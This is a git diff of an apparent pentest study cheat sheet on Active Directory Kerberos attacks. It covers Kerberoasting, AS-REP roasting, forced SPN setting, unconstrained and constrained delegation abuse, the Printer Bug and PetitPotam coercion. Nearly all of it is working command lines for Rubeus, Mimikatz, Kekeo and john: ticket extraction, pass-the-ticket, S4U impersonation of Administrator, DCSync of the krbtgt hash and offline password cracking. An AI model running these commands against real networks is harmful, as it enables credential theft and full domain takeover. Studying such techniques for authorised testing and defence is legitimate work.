@@ -19,8 +19,6 @@ Only target user service accounts and not machine accounts.
 Machine accounts wont work, because they create 100 characters and rotate it every 30 days.
 {% endhint %}
 
-
-
 ### Requirement
 
 * No privs needed
@@ -51,8 +49,6 @@ Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -properties ServicePrincip
 .\rubeus.exe kerberoast /user:svcadmin /simple
 .\rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
 
-Kerberoast all possible accounts:
-.\rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
 
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN Name from command before"
@@ -61,10 +57,14 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 
 Request-SPNTicket from PowerView can be used for cracking with John or Hashcat
 
-**3. Check if TGS in memory & save it to disk**
+**3. Save it to disk / Check if TGS in memory &**
 
 {% code overflow="wrap" %}
 ```powershell
+Kerberoast all possible accounts:
+.\rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
+ =>Maybe remove in file domain:numbers* the numbers part
+
 klist
 Invoke-Mimikatz -Command '"kerberos::list /export"'
 ```
@@ -87,7 +87,7 @@ python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\filenameOfMimikatzExport
 ### Description
 
 * If UserAccountControl setting/flag does have "Do not require Kerberos preauthentication" enabled. It is therefore possible to grab users crackable AS-REP and bruteforce offline
-* WIth sufficient rights like GenericWrite and Generic All, Kerberos preauth can be forced disabled as well
+* With sufficient rights like GenericWrite and Generic All, Kerberos preauth can be forced disabled as well
 * It does not matter if the Service is still running or if the SPN makes sense at all
 * The "pre-auth" part is Step 1 in the Diagram. Because the timestamp is encrypted with users NTLM hash, the KDC knows the request came from the user.
   * If "Do not require Kerberos preauthentication" is enabled, every user can send that request
@@ -98,43 +98,52 @@ python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\filenameOfMimikatzExport
 
 ### Tool
 
-**1.Enumerate accounts with Kerberos Preauth disabled**\
-****
+**1.Enumerate accounts with Kerberos Preauth disabled**
 
 <pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">PowerView dev: Get-DomainUser -PreauthNotRequired -verbose
 <strong>
 </strong><strong>AD Module: Get-ADUser -filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
 </strong></code></pre>
 
+**❗Enumerate all users with Kerberos preauth disalbed and request a hash**
+
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">. .\ASREPRoast\ASREPRoast.ps1
+<strong>Invoke-ASREPRoast -verbose | fl
+</strong>
+rubeus.exe asreproast /format:&#x3C;hashcat|john> /domain:&#x3C;DomainName> /outfile:&#x3C;filename>
+
+rubeus.exe asreproast /user:&#x3C;username> /format:&#x3C;hashcat|john> /domain:&#x3C;DomainName> /outfile:&#x3C;filename>
+
+Crack it
+john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt
+</code></pre>
+
 **1.OR - Force disable Kerberos PreAuth if we have enough privs GenericWrite and Generic All on user Accounts**
 
 **Enum permissions  for RDPUsers on ACL using PowerView Dev:**
 
-{% code overflow="wrap" %}
-```powershell
-Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
-Set-DomainObject -Identity user1 -xor @{useraccountcontrol=4194304} -verbose
-Get-DomainUser -PreauthNotRequired -verbose
-```
-{% endcode %}
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+
+<strong>Set-DomainObject -Identity user1 -xor @{useraccountcontrol=4194304} -verbose
+</strong>Get-DomainUser -PreauthNotRequired -verbose
+</code></pre>
 
 **2. Request encrypted AS-REP for offline cracking**
 
 {% code overflow="wrap" %}
 ```powershell
+. .\ASREPRoast\ASREPRoast.ps1
 Get-ASREPHash -Username user1 -verbose
 ```
 {% endcode %}
 
-**❗Enumerate all users with Kerberos preauth disalbed and request a hash**
+**3. Crack**&#x20;
 
+{% code overflow="wrap" %}
 ```powershell
-Invoke-ASREPRoast -verbose
-
-Crack it
-cd JohnTheRipper-bleeding-jmbo
-./john user1 --wordlist=wordlist.txt
+john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt
 ```
+{% endcode %}
 
 
 
@@ -153,17 +162,17 @@ cd JohnTheRipper-bleeding-jmbo
 
 **1.Enum possible Users**
 
-{% code overflow="wrap" %}
-```powershell
-Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
-```
-{% endcode %}
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Find-InterestingDomainAcl -ResolveGUIDs | ?{$_IdentityReferenceName -match "RDPUsers"}
+</strong><strong>
+</strong><strong>Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+</strong></code></pre>
 
 **2.Usinger PowerView dev, see if user alread has an SPN set**
 
 {% code overflow="wrap" %}
 ```powershell
-Get-DomainUser -Identity user1 | select servieprincipalname
+Get-DomainUser -Identity user1 | select ServicePrincipalName
+
 Using AD Module:
 Get-ADUser -Identity user1 -properties ServicePrincipalName | select ServicePrincipalName
 ```
@@ -173,7 +182,7 @@ Get-ADUser -Identity user1 -properties ServicePrincipalName | select ServicePrin
 
 {% code overflow="wrap" %}
 ```powershell
-Set-DomainObject -Identity user1 -Set @serviceprincipalname='what/ever'}
+Set-DomainObject -Identity user1 -Set @{serviceprincipalname='what/ever'}
 
 Using AD Module
 Set-ADuser -identity user1 -serviceprincipalname @{Add='nameyour/spn'}
@@ -184,44 +193,37 @@ Set-ADuser -identity user1 -serviceprincipalname @{Add='nameyour/spn'}
 
 {% code overflow="wrap" %}
 ```powershell
-Add-Type -AssemblyName System.IdentityModel
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "nameyour/spn"
+.\rubeus.exe kerberoast /user:user1 /simple /outfile:setspn.txt
 ```
 {% endcode %}
-
-**3. Check if TGS in memory & save it to disk**
-
-<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>klist
-</strong>Invoke-Mimikatz -Command '"kerberos::list /export"'
-</code></pre>
 
 **4. Crack it with John/Hashcat/tsrepcrack**
 
 {% code overflow="wrap" %}
 ```powershell
-python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\filenameOfMimikatzExport
+john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\setspn.txt
 ```
 {% endcode %}
 
 
 
-## 🎭 Kerberos Delegation / Impersonation
+## 🎭 Kerberos Unconstrained Delegation / Impersonation
 
 ### Description
 
 * Kerberos Delegation allows the "reuse end-user credentials to access resoruce hosted on a different server"
-* Is typically useful in multi-tier service or applications where Kerberos Double Hop is reuquired\
+* Is typically useful in multi-tier service or applications where Kerberos Double Hop is required\
   Double Hop: First Hop is where the user authenticates to, is not allowed to delegate the credentials somewhere else.&#x20;
 * For example: A user authenticates to a websserver and the webserver makes a request to a DB server. The webserver can request access to resources (all or some resources, dependending on the delegation) on the DB server as the user - not with the service account from the webserver => Impersonating the user and the webserver can act as the user on the DB server.\
-  Note: The service account for the web service must be trusted fordelegation to be able to request as a user
+  Note: The service account for the web service must be trusted for delegation to be able to request as a user
 * Unconstrained Delegation: The Server can connect to any resource in the domain, using the authenticated user account
 * Two Types of Kerberos Delegation
   * &#x20;1\. Unconstrained Delegation or General/Basic D. - allows the first hop server to request access to any service on any host in the domain as the user
   * &#x20;2\. Constrained Delegation - allows the first hop server to request access only to specified services on specific computers. If the user is not using Kerberos authentication to auth to the first hop server, Windows offers Protocol Transistoin to transit to the request to kerberos
 * Unconstrained Delegation:
-  * Allows the first hop server to request access only to specified services on specific computers.
-  * When UD is enabled, the DC places user's TGT inside TGS,  see step 4. When presented to the server with UD, the TGT is extracted from TGS and stored in LSASS. So the server can reuse the users TGT to access resources.
-  * This could be used to escalate privileges in case we can compromise the computer with UD and a Domain Admin connects to that machine
+  * Allows the first hop server to request access to any service on any host in the domain as the user
+  * When UD is enabled, the DC places user's TGT inside TGS,  see step 4. When presented to the server with UD, the TGT is extracted from TGS and stored in _**LSASS**_. So the server can reuse the users TGT to access resources.
+  * **This could be used to escalate privileges in case we can compromise the computer with UD and a Domain Admin connects to that machine**
 
 <figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
@@ -230,8 +232,6 @@ After Step 6, the DC checks, if the User is marked as "Account is sensitive and 
 
 [https://learn.microsoft.com/de-de/archive/blogs/poshchap/security-focus-analysing-account-is-sensitive-and-cannot-be-delegated-for-privileged-accounts](https://learn.microsoft.com/de-de/archive/blogs/poshchap/security-focus-analysing-account-is-sensitive-and-cannot-be-delegated-for-privileged-accounts)
 {% endhint %}
-
-Note: &#x20;
 
 ### Requirement
 
@@ -243,9 +243,9 @@ Note: &#x20;
 
 **1. Discover domain hosts (e.g machine account) which have unconstrained delegation using PowerView (Note: DC will always show up)**
 
-```powershell
-Get-NetComputer -UnConstrained
-```
+<pre class="language-powershell"><code class="lang-powershell">Get-DomainComputer -unconstrained
+<strong>Get-NetComputer -UnConstrained
+</strong></code></pre>
 
 Using AD Module
 
@@ -258,20 +258,57 @@ Get-AD-User -Filter {TrustedForDelegation -eq $true}
 
 **2. Compromise the server where Unconstrained Delegation is enabled and get all the Kerberos Tokens (wait for admin user to connect?)**
 
-```powershell
-Invoke-Mimikatz -command '"sekurlsa::ticket"'
-Invoke-Mimikatz -command '"sekurlsa::ticket /export"'  //saves it to the disk - then ls | select name
-```
+<pre class="language-powershell"><code class="lang-powershell">Compromise the server where Unconstrained Delegation is enabled, then
+<strong>Invoke-Mimikatz -command '"sekurlsa::ticket"'
+</strong>Invoke-Mimikatz -command '"sekurlsa::ticket /export"'  //saves it to the disk - then ls | select name
+</code></pre>
 
 **3. Reuse the token**&#x20;
 
 {% code overflow="wrap" %}
 ```powershell
-Invoke-Mimikatz -command '"kerberos::ptt C:\path\to\ticket"'
+Invoke-Mimikatz -command '"kerberos::ptt C:\path\to\ticket.kirbi"'
 ```
 {% endcode %}
 
+## **🖨 Printer Bug**
 
+### Description
+
+* Print Bug can be used to trick a high priv user to connect to a machine with unconstrained delegation
+* Feature MS-RPRN which allows any domain user (Authenticated user) to force any machine, running the Spooler service, to connect to a second machien of the domain.
+* We can force the dc to connect to appserver abusing Printer Bug
+
+**Requirement**
+
+* Control over an unconstrained delegation machine
+
+**Tool**
+
+Capture TGT of the dchost on the appserver host, then run MS-RPRN.exe ([https://github.com/leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample))
+
+```
+.\rubeus.exe monitor /interval:1 /nowrap
+MS-RPRN.exe \\dchost.dom.local \\appserver.dom.local  /on studentmachine
+
+Copy the base64 encoded TGT, remove extra spaces/crlf if any, and use it on another host
+.\rubeus.exe ptt /ticket:...
+
+Run DCSync
+Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'
+```
+
+## 🦛PetitPotam
+
+### Description
+
+* PetitPotam uses EfsRpcOpenFileRaw function of MS EFSRPC (Encrypting File System Remote Protocol) protocol and doesn't need credentials when used against a DC.See above
+
+```powershell
+.\rubeus.exe monitor /interval:1 /nowrap
+PetitPotam.exe appserver-hostname dchostname
+
+```
 
 ## ↙🎭 Kerberos Constrained Delegation&#x20;
 
@@ -297,10 +334,13 @@ Invoke-Mimikatz -command '"kerberos::ptt C:\path\to\ticket"'
 
 &#x20;**1. Enumerate users and computers with constrained delegation enabled - with PowerView**
 
+{% code overflow="wrap" %}
 ```powershell
 Get-DomainUser -TrustedToAuth
 Get-DomainComputer -TrustedToAuth
+
 ```
+{% endcode %}
 
 With ActiveDirectory Module
 
@@ -308,9 +348,17 @@ With ActiveDirectory Module
 Get-ADObject -filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTO
 ```
 
-**2. Using plaintext password of NTLM hash of the service account to request a TGT using asktgt from Kekeo (Step 2 & 3 in diagram)**
+**❗Step 2 and 3 together (TGT & TGS)**
 
-<pre><code><strong>.\kekeo.exe
+{% code overflow="wrap" %}
+```
+rubeus.exe s4u /user:username /aes256:hash /impersonateuser:Administrator /msdsspn:CIFS/dc.dom.loacl /ptt
+```
+{% endcode %}
+
+**2. Using plaintext password or NTLM/AES hash of the service account to request a TGT using asktgt from Kekeo (Step 2 & 3 in diagram)**
+
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>.\kekeo.exe
 </strong><strong>kekeo# tgt::ask /user:serviceusername /domain:dom.local /rc4:rc4hash
 </strong></code></pre>
 
@@ -318,25 +366,33 @@ Kekeo can read/write tickets without injecting into lsass and without having adm
 
 **3. Once we have t TGT,  using s4u from keko, we can request a TGS (step 4 and 5 in diagram)**
 
+{% code overflow="wrap" %}
 ```
-kekeo# s4u /tgt:filename.kirbi /user:administrator@dom.local /service:full_service_name
+kekeo# s4u /tgt:filename.kirbi /user:administrator@dom.local /service:full_service_name_eg_cifs/dc-fqdn-name
+
 ```
+{% endcode %}
 
 **4. Inject the TGS ticket in the current session**&#x20;
 
 ```powershell
 Invoke-Mimikatz -command '"kerberos::ptt filename_to_tgs_from_kekeo.kirbi"'
-ls \\dom.local\c$
+ls \\host.dom.local\c$
 ```
 
-**5.  Using asktgt from Kekeo, we request a TGT and then a TGS**
+**If delegation is for non intrusive service but done with e.g Administrator, everything else with that user can be abused. Kekeo, we request a TGT and then a TGS**
 
+{% code overflow="wrap" %}
 ```powershell
 tgt::ask /user:usernae$ /domain:dom.local /rc4:rc4here
 
 tgs::s4u /tgt:filename.kirbi /user:Administrator@dom.local /service:time/dom.local|ldap/dom.local
 => We also request LDAP Access as Administrator, which runs under the same service account as the regular time service
+
+Same with rubeus in one command:
+Rubeus.exe s4u /user:machine-user$ /aes256:.... /impersonateuser:Administrator /msdsspn:time/dom.local /altservice:ldap /ptt
 ```
+{% endcode %}
 
 ```
 Invoke-Mimikatz -command '"kerberos::ptt filename.kirbi"'
@@ -355,7 +411,7 @@ Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'
 ### Requirement
 
 * DC serves also as DNS Server
-* We compromised a User, who is member of DNSAdmins Group
+* We compromised a User, wrho is member of DNSAdmins Group
 * Misonfiguration which is needed: DNSAdmins group, need the privs to restart the DNS Service - this is by default disabled. &#x20;
 
 ### Tool
